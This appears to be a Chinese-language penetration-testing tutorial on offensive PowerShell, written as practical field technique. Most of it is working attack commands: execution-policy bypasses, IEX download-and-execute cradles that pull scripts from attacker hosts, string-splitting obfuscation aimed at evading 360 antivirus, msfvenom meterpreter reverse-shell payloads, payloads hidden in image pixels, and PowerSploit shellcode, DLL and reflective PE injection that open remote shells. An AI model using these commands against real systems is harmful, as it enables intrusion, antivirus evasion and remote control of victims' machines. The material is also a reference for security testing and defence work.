# Powershell实战渗透技巧
**早就听闻powershell是一个功能强大的shell，如同linux的bash，并且支持.NET，全凭命令操作windows服务。现被更广泛用于渗透攻击等方面，在不需要写入磁盘的情况下执行命令，也可以逃避Anti-Virus检测。**

## 语法

> | 管道符的作用是将一个命令的输出作为另一个命令的输入
> 
> ; 分号用来连续执行系统命令
> 
> ＆是调用操作符，它允许你执行命令，脚本或函数
> 
> 双引号可以替换内部变量
> 
> 双引号里的双引号，单引号里的单引号，写两遍输出

## 常用命令

> 使用powershell满足一个标椎动词-名词组合，来帮助我们更快理解。
> 
> Get-Alias -name dir 查看别名
> 
> Ls env 查看当前环境变量
> 
> Get-ExecutionPolicy 查看当前执行策略
> 
> Set-ExecutionPolicy 设置执行的策略
> 
> Get-Host 查看powershell版本
> 
> Get-Content 查看文件内容
> 
> Get-Content test.txt  显示文本内容
> 
> Set-Content test.txt-Value “hello,word” 设置文本内容
> 
> Get-Process  查看当前服务列表
> 
> Get-Location 获取当前位置
> 
> Get-WmiObject -Class Win32_ComputerSystem |Select-object -ExpandProperty UserName 查看登录到物理机的用户

## 执行策略

> powershell有六种执行策略：
> 
> Unrestricted  权限最高，可以不受限制执行任意脚本
> 
> Restricted  默认策略，不允许任意脚本的执行
> 
> AllSigned  所有脚本必须经过签名运行
> 
> RemoteSigned  本地脚本无限制，但是对来自网络的脚本必须经过签名
> 
> Bypass   没有任何限制和提示
> 
> Undefined  没有设置脚本的策略
> 
> 默认情况下，禁止脚本执行。除非管理员更改执行策略。Set-ExecutionPolicy

绕过执行策略执行大概有以下几种：

**1.本地读取然后通过管道符运行**

> powershell Get-Content 1.ps1 | powershell -NoProfile –

**2.远程下载并通过IEX运行脚本**

> powershell -c “IEX(New-Object Net.WebClient).DownloadString(‘[http://xxx.xxx.xxx/a.ps1](http://xxx.xxx.xxx/a.ps1)‘)”

**3.Bypass执行策略绕过**

> powershell -ExecutionPolicy bypass -File ./a.ps1

不会显示警告和提示

**4.Unrestricted执行策略标志**

> powershell -ExecutionPolicy unrestricted -File ./a.ps1

当运行一个从网上下载的未签名的脚本时，会给出权限提示

需要解释的是：

> Invoke-Expression（IEX的别名）：用来把字符串当作命令执行。
> 
> WindowStyle Hidden（-w Hidden）：隐藏窗口
> 
> Nonlnteractive（-NonI）：非交互模式，PowerShell不为用户提供交互的提示。
> 
> NoProfile（-NoP）：PowerShell控制台不加载当前用户的配置文件。
> 
> Noexit（-Noe）：执行后不退出Shell。
> 
> EncodedCommand（-enc）: 接受base64 encode的字符串编码，避免一些解析问题

## bypass Anti-Virus

如果考虑实际情况，假设我们获取了一个webshell。以上的几种方法只有IEX可以远程加载直接运行，其余都需要上传ps木马再绕过执行策略。

msfvenom生成ps木马

> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.203.140 LPORT=4444 -f psh-reflection >a.ps1

但是一些Anti-Virus对powershell命令查杀比较严格。以360为例：

对于后一种，可以将绕过执行策略的命令修改为bat文件后再次运行。可绕过360

> powershell -ExecutionPolicy bypass -File ./a.ps1

将该命令保存为c.bat，菜刀运行即可。

[![](_v_images/20200115090856261_23451.png)](https://.3001.net/_v_s/20191114/1573714871_5dccfbb7c647e.png)

对于IEX这种方便快捷的方式直接运行会被360拦截。可尝试从语法上简单变化。

主要是对DownloadString、http做一些处理。

比如这个：

> powershell.exe 
> 
> ”
> 
> $c1=’powershell -c IEX’;
> 
> $c2=’(New-Object Net.WebClient).Downlo’;
> 
> $c3=’adString(”[http://192.168.197.192/a.ps1](http://192.168.197.192/a.ps1)”)’;
> 
> echo ($c1,$c2,$c3)
> 
> ”

先将命令拆分为字符串，然后进行拼接。

需要注意的是双引号可以输出变量，两个单引号连用才能输出一个单引号。

[![](_v_images/20200115090855951_13254.png)](https://.3001.net/_v_s/20191114/1573714907_5dccfbdb9ff7f.png)

成功输出该命令。echo修改为IEX即可运行，bypass 360。

[![](_v_images/20200115090855745_28435.png)](https://.3001.net/_v_s/20191114/1573714930_5dccfbf2e18a3.png)

也可以使用replace替换函数，bypass。

> powershell “$c1=’IEX(New-Object Net.WebClient).Downlo’;$c2=’123(”[http://192.168.197.192/a.ps1](http://192.168.197.192/a.ps1)”)’.Replace(’123′,’adString’);IEX ($c1+$c2)”

也可以对http字符进行绕过，同样可以bypass

> powershell “$a=’IEX((new-object net.webclient).downloadstring(”ht’;$b=’tp://192.168.197.192/a.ps1”))’;IEX ($a+$b)” 

[![](_v_images/20200115090855538_24678.png)](https://.3001.net/_v_s/20191114/1573714954_5dccfc0aeed14.png)

实际测试也可以在菜刀里直接运行后产生session

为了更好用于实战，可以在c、vbs、hta、python等语言中执行该系统命令，达到bypass的效果。

大佬们还写出了用于编码和混淆的框架

> [https://github.com/danielbohannon/Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
> 
> [https://www.freebuf.com/sectool/136328.html](https://www.freebuf.com/sectool/136328.html)

还有一款通过图片免杀执行powershell的脚本Invoke-PSImage.ps1，主要把payload分散存到图片的像素中,最后到远端执行时,再重新遍历重组像素中的payload执行。

> 参考资料：[https://github.com/peewpw/Invoke-PSImage](https://github.com/peewpw/Invoke-PSImage)

在利用的时候需要准备一张足够大的图片。我用的是1900*1200的图片x.jpg。

> C:\\>powershell
> 
> PS C:\\> Import-Module .\\Invoke-PSImage.ps1
> 
> PS C:\\> Invoke-PSImage -Script .\\a.ps1 -Image .\\x.jpg -Out .\\reverse_shell.png -Web

a.ps1是msf木马，-Out 生成reverse_shell.png图片，-Web 输出从web读取的命令。

[![](_v_images/20200115090855333_16562.png)](https://.3001.net/_v_s/20191114/1573714988_5dccfc2c083e1.png)

并将reverse_shell.png移动至web目录，替换url地址。在powershell下执行即可。

[![](_v_images/20200115090855127_23061.png)](https://.3001.net/_v_s/20191114/1573715004_5dccfc3c74651.png)

## 加载shellcode、dll、exe

在《web安全攻防》书里有利用 PowerSploit 脚本加载shellcode、dll反弹meterpreter shell的方法。我把之前的笔记放在这里。

**1.加载shellcode**

msfvenom生成脚本木马

> msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.72.164 LPORT=4444 -f powershell -o /var/www/html/test 

在windows靶机上运行一下命令

> IEX(New-Object Net.WebClient).DownloadString(“[http://144.34.xx.xx/PowerSploit/CodeExecution/Invoke-Shellcode.ps1](http://144.34.xx.xx/PowerSploit/CodeExecution/Invoke-Shellcode.ps1)“)
> 
> IEX(New-Object Net.WebClient).DownloadString(“[http://192.168.72.164/test](http://192.168.72.164/test)“)
> 
> Invoke-Shellcode -Shellcode ($buf) -Force  运行木马

使用Invoke-Shellcode.ps1脚本执行shellcode

即可反弹meterpreter shell

[![](_v_images/20200115090854921_4602.png)](https://.3001.net/_v_s/20191114/1573715032_5dccfc5864cc2.png)

**2.加载dll**

使用msfvenom 生成dll木马脚本

> msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.72.164 lport=4444 -f dll -o /var/www/html/test.dll

将生成的dll上传到目标的C盘。在靶机上执行以下命令

> IEX(New-Object Net.WebClient).DownloadString(“[http://144.34.xx.xx/PowerSploit/CodeExecution/Invoke-DllInjection.ps1](http://144.34.xx.xx/PowerSploit/CodeExecution/Invoke-DllInjection.ps1)“)

> Start-Process c:\\windows\\system32\\notepad.exe -WindowStyle Hidden 

创建新的进程启动记事本，并设置为隐藏

> Invoke-DllInjection -ProcessID xxx -Dll c:\\test.dll 使用notepad的PID 

使用Invoke-DLLinjection脚本，启动新的进程进行dll注入(没有杀毒软件)

[![](_v_images/20200115090854611_13453.png)](https://.3001.net/_v_s/20191114/1573715059_5dccfc73f3353.png)

即可反弹meterpreter session

**3.加载exe**

msfvenom生成exe木马（不免杀）

> msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.197.195 lport=4444 -f exe > /var/www/html/test.exe 

还是powersploit的Invoke-ReflectivePEInjection.ps1脚本，可以直接远程加载exe达到bypass

> powershell.exe -exec bypass -c “IEX(New-Object Net.WebClient).DownloadString(‘[https://raw.githubusercontent.com/clymb3r/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1](https://raw.githubusercontent.com/clymb3r/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1)‘);Invoke-ReflectivePEInjection -PEUrl [http://192.168.197.195/test.exe](http://192.168.197.195/test.exe)   -ForceASLR” 

成功反弹meterpreter shell

[![](_v_images/20200115090854277_3545.png)](https://.3001.net/_v_s/20191114/1573715085_5dccfc8d84856.png)

该脚本也可以结合之前的bypass方式进行免杀提权。

其余参考资料

> [15-ways-bypass-powershell-exec](https://04z.net/archives/269bd44f.html#6-%E4%BD%BF%E7%94%A8-encodedcommand%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0)
> 
> [Powershell-Basic-learning](https://04z.net/archives/61cbf444.html)